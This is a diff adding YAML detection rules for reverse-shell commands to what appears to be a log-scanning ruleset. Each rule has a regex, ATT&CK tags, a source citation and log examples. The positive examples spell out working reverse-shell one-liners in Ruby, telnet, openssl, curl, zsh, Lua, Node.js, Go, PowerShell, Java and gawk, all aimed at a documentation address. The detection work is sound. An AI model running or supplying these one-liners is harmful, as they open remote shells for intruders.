+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    spawn("sh", [:in,:out,:err]=>TCPSocket.new(host, port)) redirects a spawned process's three streams to a new TCP
+    connection; it has no administrative use.
+  examples:
+    positive:
+      - 'Nov 20 10:21:00 web01 bash[5149]: HISTORY: ruby -rsocket -e''spawn("sh",[:in,:out,:err]=>TCPSocket.new("203.0.113.7",4444))'''
+    negative:
+      - 'Nov 20 10:21:01 web01 app[702]: spawn("convert", [:out, :err] => "/tmp/convert.log")'
+      - 'Nov 20 10:21:02 web01 app[702]: TCPSocket.new("redis01", 6379) connected'
+
+- id: mention.revshell.telnet_shell_relay
+  title: Two telnet sessions with a shell between them
+  match:
+    anchored: 'telnet [^\n|]{1,80}\| {0,2}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh {0,2}\| {0,2}telnet '
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Reverse Shell Command Line (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
+    license: DRL-1.1
+    upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
+  rationale: >-
+    Generalizes the rule's ' | /bin/bash | telnet ' keyword: commands arrive on one telnet connection, run in a shell
+    and the output leaves on a second. It is the reverse shell for hosts with only telnet.
+  examples:
+    positive:
+      - 'Nov 20 10:22:00 web01 bash[5150]: HISTORY: telnet 203.0.113.7 8080 | /bin/sh | telnet 203.0.113.7 8081'
+    negative:
+      - 'Nov 20 10:22:01 web01 bash[5151]: HISTORY: telnet mail01 25'
+      - 'Nov 20 10:22:02 web01 bash[5152]: HISTORY: echo quit | telnet 10.0.0.5 110 | grep +OK'
+
+- id: mention.revshell.openssl_client_to_shell
+  title: openssl s_client output piped into a shell
+  match:
+    anchored: 'openssl s_client [^\n|]{0,120}\| {0,2}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1573.002]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    Running whatever arrives over a TLS client connection in a shell is an encrypted reverse shell or a dropper.
+    Administrators pipe s_client into openssl x509 or grep, never into a shell.
+  examples:
+    positive:
+      - 'Nov 20 10:23:00 web01 bash[5153]: HISTORY: openssl s_client -quiet -connect 203.0.113.7:443 | /bin/bash'
+    negative:
+      - 'Nov 20 10:23:01 web01 bash[5154]: HISTORY: openssl s_client -connect www.example.org:443 </dev/null | openssl x509 -noout -dates'
+      - 'Nov 20 10:23:02 web01 bash[5155]: HISTORY: openssl s_client -connect ldap01:636 -showcerts'
+
+- id: mention.revshell.curl_telnet_shell
+  title: curl telnet:// stream wired to a shell
+  match:
+    anchored: 'curl [^\n]{0,20}telnet://[^\n]{1,100}\| {0,2}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    curl's telnet:// scheme gives a raw TCP stream; piping it through a shell is a reverse shell on hosts without
+    netcat. curl's telnet support is otherwise almost never used.
+  examples:
+    positive:
+      - 'Nov 20 10:24:00 web01 bash[5156]: HISTORY: C=''curl -Ns telnet://203.0.113.7:4444''; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null'
+    negative:
+      - 'Nov 20 10:24:01 web01 bash[5157]: HISTORY: curl -v telnet://mail01:25'
+      - 'Nov 20 10:24:02 web01 bash[5158]: HISTORY: curl -fsS https://status.example.org/health | jq .'
+
+- id: mention.revshell.zsh_ztcp
+  title: zsh ztcp connection handed to a shell
+  match:
+    anchored: 'ztcp [^\n]{1,80}(?:ba|da|z|k)?sh >&\$REPLY'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    zsh's ztcp module opens a TCP connection in $REPLY; redirecting a shell onto $REPLY is the zsh reverse shell.
+    The module is rarely loaded for anything else.
+  examples:
+    positive:
+      - 'Nov 20 10:25:00 mac01 zsh[5159]: HISTORY: zsh -c ''zmodload zsh/net/tcp && ztcp 203.0.113.7 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'''
+    negative:
+      - 'Nov 20 10:25:01 mac01 zsh[5160]: HISTORY: zmodload zsh/complist'
+      - 'Nov 20 10:25:02 mac01 zsh[5161]: HISTORY: echo $REPLY'
+
+- id: mention.revshell.lua_socket_execute
+  title: Lua socket connect followed by os.execute
+  match:
+    anchored: 'require\(["'']socket["'']\)[^\n]{0,200}:connect\([^\n]{0,200}os\.execute\('
+  case_sensitive: false
+  strength: strong
+  attack: [T1059, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    A Lua one-liner that loads LuaSocket, connects out and then calls os.execute is the Lua reverse shell (seen on
+    embedded and router platforms where Lua is the only interpreter).
+  examples:
+    positive:
+      - 'Nov 20 10:26:00 rtr02 sh[400]: lua -e "require(''socket'');require(''os'');t=socket.tcp();t:connect(''203.0.113.7'',''4444'');os.execute(''/bin/sh -i <&3 >&3 2>&3'');"'
+    negative:
+      - 'Nov 20 10:26:01 rtr02 uhttpd[401]: lua: require("socket") loaded for luci-rpc'
+      - 'Nov 20 10:26:02 rtr02 sh[402]: lua -e "print(os.date())"'
+
+- id: mention.revshell.node_child_process_shell
+  title: Node.js child_process used with netcat or a socket
+  match:
+    anchored: 'require\(["'']child_process["'']\)[^\n]{0,200}(?:nc -e|nc [^\n]{1,60} -e|/dev/tcp/|new net\.Socket)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.007, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    Node.js reverse shells either exec 'nc -e' through child_process or spawn a shell and pipe it to a net.Socket. In
+    injected payloads (SSTI, prototype pollution, deserialization) this text is the exploit; ordinary Node code does
+    not combine child_process with netcat or /dev/tcp.
+  examples:
+    positive:
+      - '203.0.113.58 - - [20/Nov/2026:10:27:00 +0000] "POST /api/render HTTP/1.1" 500 21 "-" "-" body="require(''child_process'').exec(''nc -e /bin/sh 203.0.113.58 4444'')"'
+    negative:
+      - '2026-11-20T10:27:01Z app[703]: const { execFile } = require("child_process"); execFile("git", ["rev-parse", "HEAD"])'
+      - '2026-11-20T10:27:02Z app[703]: Error: Cannot find module ''child_process_helper'''
+
+- id: mention.revshell.node_pipe_sh_stdin
+  title: Node.js socket piped into a spawned shell
+  match:
+    literal: ['.pipe(sh.stdin)']
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.007, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    'client.pipe(sh.stdin)' feeds a network socket into a spawned shell, the core of the Node.js reverse shell. The
+    variable name sh is the generator's, so this is a positive-only lead that a renamed variable evades.
+  examples:
+    positive:
+      - 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(4444,"203.0.113.7",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);});'
+    negative:
+      - '2026-11-20T10:28:00Z app[704]: req.pipe(fs.createWriteStream("/tmp/upload"))'
+      - '2026-11-20T10:28:01Z app[704]: proc.stdout.pipe(process.stdout)'
+
+- id: mention.revshell.go_dial_exec_shell
+  title: Go program dialing TCP and running a shell
+  match:
+    anchored: 'net\.Dial\( {0,2}["'']tcp["''][^\n]{1,160}exec\.Command\( {0,2}["''](?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    The 'echo package main ... > /tmp/t.go && go run' reverse shell dials TCP and runs a shell with the connection as
+    its streams, all on one line; Go services do not write such programs on the fly.
+  examples:
+    positive:
+      - 'Nov 20 10:29:00 web01 bash[5162]: HISTORY: echo ''package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","203.0.113.7:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'' > /tmp/t.go && go run /tmp/t.go'
+    negative:
+      - '2026-11-20T10:29:01Z svc[705]: net.Dial("tcp", "redis01:6379") ok'
+      - '2026-11-20T10:29:02Z svc[705]: exec.Command("git", "pull") finished'
+
+- id: mention.revshell.powershell_tcpclient_iex
+  title: PowerShell TCP client stream fed to Invoke-Expression
+  match:
+    anchored: 'Sockets\.TCPClient\([^\n]{1,200}\.GetStream\(\)[^\n]{0,900}(?:\biex\b|Invoke-Expression)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.001, T1095]
+  telemetry: [windows_text]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    The PowerShell reverse shell opens a Net.Sockets.TCPClient, reads its stream and runs each received string with
+    iex or Invoke-Expression. Port-test scripts create a TCPClient but never execute what they receive.
+  examples:
+    positive:
+      - 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''203.0.113.7'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String )}"'
+    negative:
+      - '$t = New-Object System.Net.Sockets.TcpClient(''sql01'',1433); $t.Connected; $t.Close()'
+      - '$c = New-Object Net.Sockets.TCPClient(''mail01'',25); $s = $c.GetStream(); $s.Write($hello,0,$hello.Length)'
+
+- id: mention.revshell.java_exec_dev_tcp
+  title: Java Runtime.exec of a /dev/tcp command
+  match:
+    anchored: 'getRuntime\(\)\.exec\([^\n]{0,200}/dev/(?:tcp|udp)/'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1190]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    Deserialization, expression-injection and Groovy payloads reach Runtime.exec with a bash /dev/tcp reverse shell
+    as the argument; Java applications do not exec bash socket redirections.
+  examples:
+    positive:
+      - '2026-11-20 10:30:00 ERROR [exec-9] payload: Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"})'
+    negative:
+      - '2026-11-20 10:30:01 INFO  [exec-9] Runtime.getRuntime().exec("/usr/bin/convert in.png out.jpg") finished'
+      - '2026-11-20 10:30:02 INFO  [main] Runtime.getRuntime().availableProcessors() = 8'
+
+- id: mention.revshell.xterm_remote_display
+  title: xterm opened on a remote IP display
+  match:
+    anchored: 'xterm {1,3}-display {1,3}[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,2}'
+  case_sensitive: false
+  strength: medium
+  attack: [T1059.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Potential Xterm Reverse Shell (@d4ns4n_)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_xterm_reverse_shell.yml
+    license: DRL-1.1
+    upstream_id: 4e25af4b-246d-44ea-8563-e42aacab006b
+  rationale: >-
+    Sending an xterm to an X server at an IP address gives that server a shell on this host. Remote X sessions to a
+    workstation are rare but legitimate, so it is medium; a local display (127.0.0.1:0) also matches and is the known
+    benign case.
+  examples:
+    positive:
+      - 'Nov 20 10:31:00 web01 bash[5163]: HISTORY: xterm -display 203.0.113.7:1'
+    negative:
+      - 'Nov 20 10:31:01 web01 bash[5164]: HISTORY: xterm -display :0'
+      - 'Nov 20 10:31:02 web01 bash[5165]: HISTORY: xterm -display ws01.corp.example.org:0'
+
+- id: mention.revshell.gawk_inet_tcp
+  title: gawk network special file
+  match:
+    literal: ['/inet/tcp/0/', '/inet/udp/0/']
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Reverse Shell Command Line (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
+    license: DRL-1.1
+    upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
+  rationale: >-
+    Generalizes the rule's awk keyword 'BEGIN {s = "/inet/tcp/0/': gawk's /inet/tcp/0/host/port special file opens a
+    client socket, which the awk reverse shell uses. Real gawk networking scripts are very rare on servers.
+  examples:
+    positive:
+      - 'Nov 20 10:32:00 web01 bash[5166]: HISTORY: awk ''BEGIN {s = "/inet/tcp/0/203.0.113.7/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'' /dev/null'
+    negative:
+      - 'Nov 20 10:32:01 web01 bash[5167]: HISTORY: awk ''{print $1}'' /var/log/nginx/access.log'
+      - 'Nov 20 10:32:02 web01 bash[5168]: HISTORY: cat /proc/net/tcp | awk ''{print $2}'''
